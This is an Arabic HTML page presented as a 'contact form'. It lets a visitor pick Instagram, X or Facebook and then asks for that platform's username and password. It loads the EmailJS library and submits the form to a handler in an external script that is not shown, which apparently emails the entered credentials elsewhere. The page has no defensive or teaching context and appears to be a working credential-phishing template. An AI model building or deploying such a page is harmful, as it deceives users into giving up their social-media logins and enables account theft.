<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نموذج الاتصال</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="script.js" defer></script> <!-- استدعاء الملف الخارجي -->
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8f8f8;
            margin: 0;
            padding: 0;
            color: #333;
            direction: rtl;
        }
        header {
            padding: 15px 30px;
            background-color: #222;
            color: white;
        }
        .platform {
            margin: 15px;
            padding: 15px 30px;
            background-color: #444;
            color: white;
            border-radius: 10px;
            cursor: pointer;
        }
        .platform:hover {
            background-color: #666;
        }
        .form-container {
            display: none;
            margin-top: 30px;
        }
        .form-container input, .form-container button {
            width: 90%;
            max-width: 400px;
            padding: 12px;
            margin: 10px auto;
            display: block;
            border: 1px solid #ddd;
            border-radius: 8px;
        }
        .form-container button {
            background-color: #444;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>
<header>
    <h1>نموذج الاتصال</h1>
</header>

<div class="content">
    <h2>اختر المنصة</h2>
    <div class="platform" onclick="activateContactForm('إنستغرام')">إنستغرام</div>
    <div class="platform" onclick="activateContactForm('إكس')">إكس</div>
    <div class="platform" onclick="activateContactForm('فيسبوك')">فيسبوك</div>

    <div class="form-container" id="form-container">
        <h3 id="platform-name">التسجيل في</h3>
        <form id="registration-form" onsubmit="sendPlatformData(event)">
            <input type="text" id="username" placeholder="اسم المستخدم" required>
            <input type="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit">إرسال</button>
        </form>
    </div>
</div>
</body>
</html>
